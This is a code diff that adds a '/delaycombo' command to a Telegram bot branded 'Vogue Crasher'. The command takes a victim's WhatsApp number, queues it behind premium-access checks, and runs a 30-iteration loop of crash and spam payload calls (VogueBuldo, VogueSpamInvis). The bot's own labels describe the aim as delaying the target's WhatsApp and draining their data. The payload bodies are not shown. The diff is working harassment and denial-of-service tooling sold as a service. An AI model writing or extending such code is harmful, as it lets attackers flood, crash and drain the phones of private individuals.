@@ -4376,6 +4376,118 @@ Please verify the target input and system status before retrying.`
     }
 });
 
+bot.command('delaycombo', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+
+    let q =
+        ctx.message?.text
+        ?.split(" ")[1];
+
+    if (!q) {
+
+        return ctx.reply(
+`Invalid Format
+
+Usage:
+/delaycombo <target_number>
+
+Example:
+/delaycombo 628xxxxxxxx`
+        );
+    }
+
+    let clean =
+        q.replace(
+            /[^0-9]/g,
+            ""
+        );
+
+    let target =
+        clean +
+        "@s.whatsapp.net";
+
+    try {
+
+        addQueue({
+            id: Date.now(),
+            target,
+            number: clean,
+            type: "delaycombo",
+            createdAt: Date.now()
+        });
+
+        const queuePos =
+            spamQueue.length;
+
+        const TASK_DURATION =
+            (30 * 3000) +
+            (3 * 60 * 1000);
+
+        const estimatedMs =
+            (queuePos - 1) *
+            TASK_DURATION;
+
+        const nextQueueTime =
+            moment(
+                Date.now() + estimatedMs
+            )
+            .tz("Asia/Jakarta")
+            .format("HH:mm:ss");
+
+        await ctx.replyWithPhoto(
+            thumbnailUrl,
+            {
+                caption:
+`\`\`\`ruby
+V O G U E • C R A S H E R
+────────────────────────
+Q U E U E • S T A T U S
+
+Target      : ${clean}
+Queue       : #${queuePos}
+Next Run    : ${nextQueueTime} WIB
+State       : Added To Queue
+Description : Combo Delay Hard + Drainet!
+────────────────────────
+\`\`\``,
+                parse_mode:
+                    "Markdown",
+
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text:
+                                    "Check Target",
+
+                                url:
+`https://wa.me/${clean}`
+                            }
+                        ]
+                    ]
+                }
+            }
+        );
+
+        processDelayComboQueue();
+
+    } catch (error) {
+
+        ctx.reply(
+`Operation Failed
+
+The system was unable to execute the requested module.`
+        );
+
+        console.log(
+            `[VOGUE CRASHER] ${error.message}`
+        );
+
+        await restartBot(
+            "Connection Closed"
+        );
+    }
+});
+
 bot.command('hardspam', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
         let q =
             ctx.message?.text
@@ -4963,6 +5075,128 @@ Engine   : Vogue Queue System
         }
     }
     
+    queueRunning = false;
+}
+
+async function processDelayComboQueue() {
+    if (queueRunning) return;
+    queueRunning = true;
+    while (spamQueue.length > 0) {
+        const job =
+            spamQueue[0];
+        const {
+            target,
+            number,
+            type
+        } = job;
+
+        if (
+            type !== "delaycombo"
+        ) {
+
+            break;
+        }
+
+        const queueNumber =
+            job.id;
+
+        const instanceId =
+            Date.now() + Math.random();
+
+        console.log(
+            `[DELAYCOMBO ${queueNumber}] Starting ${number}`
+        );
+
+        try {
+            
+            await VogueBuldo(sock, target)
+            console.log(`[DELAYCOMBO #${queueNumber}] QUOTA USAGE SENT!!`)
+
+            for (let i = 0; i < 30; i++) {
+
+                try {
+
+                    await VogueSpamInvis(
+                        sock,
+                        target
+                    );
+
+                    await VogueBuldo(
+                        sock,
+                        target
+                    );
+
+                    console.log(
+                        `[DELAYCOMBO #${queueNumber}] [WORKER ${instanceId}] Loop ${i + 1}/30`
+                    );
+
+                    await sleep(3000);
+
+                } catch (e) {
+
+                    console.log(
+                        `[DELAYCOMBO #${queueNumber}] [WORKER ${instanceId}] ${e.message}`
+                    );
+
+                    await restartBot(
+                        "Connection Closed"
+                    );
+
+                    break;
+                }
+            }
+
+            console.log(
+                `[DELAYCOMBO #${queueNumber}] Finished ${number}`
+            );
+
+            try {
+
+                await bot.telegram.sendMessage(
+                    LOG_QUEUE_CHANNEL_ID,
+`\`\`\`ruby
+DELAYCOMBO COMPLETED
+
+Queue ID : #${queueNumber}
+Loop     : 30
+Status   : Finished
+Engine   : Vogue Combo System
+\`\`\``,
+{
+    parse_mode: "Markdown"
+}
+                );
+
+            } catch (e) {
+
+                console.log(
+                    `[LOG ERROR] ${e.message}`
+                );
+            }
+
+            removeFirstQueue();
+
+            if (spamQueue.length > 0) {
+
+                console.log(
+                    `[DELAYCOMBO] Waiting 3 minutes before next task`
+                );
+
+                await sleep(
+                    3 * 60 * 1000
+                );
+            }
+
+        } catch (err) {
+
+            console.log(
+                `[DELAYCOMBO ERROR] ${err.message}`
+            );
+
+            removeFirstQueue();
+        }
+    }
+
     queueRunning = false;
 }
 
